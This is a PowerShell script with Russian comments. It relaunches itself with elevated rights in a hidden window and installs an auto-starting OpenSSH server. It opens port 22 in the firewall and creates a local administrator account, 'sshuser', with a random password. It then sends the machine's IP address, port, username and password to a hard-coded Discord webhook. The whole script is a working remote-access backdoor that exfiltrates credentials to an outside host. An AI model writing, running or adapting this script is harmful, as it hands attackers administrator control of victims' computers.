# Проверяем, запущен ли скрипт с правами администратора
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "❌ Требуются права администратора. Перезапуск с повышенными привилегиями..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-NoP -Ep Bypass -W H -File `"$PSCommandPath`"" -Verb runAs
    exit
}

try {
    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # Устанавливаем SSH Server
    if ($IsLinux) {
        Write-Host "🔄 Установка OpenSSH Server на Linux..."
        & sudo apt install openssh-server -y
    } else {
        Write-Host "🔄 Установка OpenSSH Server на Windows..."
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'

        # Настраиваем firewall, если правила нет
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
        }
    }

    # Генерируем случайный пароль
    Write-Host "🔑 Генерация пароля для пользователя..."
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })

    # Добавляем пользователя для подключения (только Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        Write-Host "➕ Создание пользователя '$Username'..."
        net user $Username $Password /add
        net localgroup administrators $Username /add
    }

    # Получаем IP-адрес
    Write-Host "🌐 Получение IP-адреса..."
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress

    # Настройки порта
    $Port = 22

    # Отправляем данные в Discord
    Write-Host "📤 Отправка данных в Discord через вебхук..."
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'
    $Message = @{
        content = "🛠️ OpenSSH Server установлен!\nIP: $IPAddress\nPort: $Port\nUser: $Username\nPassword: $Password"
    }
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'

    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    Write-Host "✅ Установка завершена за $Elapsed сек." -ForegroundColor Green
} catch {
    Write-Host "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Детали ошибки: $($_.Exception.StackTrace)" -ForegroundColor DarkYellow
} finally {
    Write-Host "🔽 Нажмите любую клавишу для выхода..." -ForegroundColor Yellow
    Pause
}
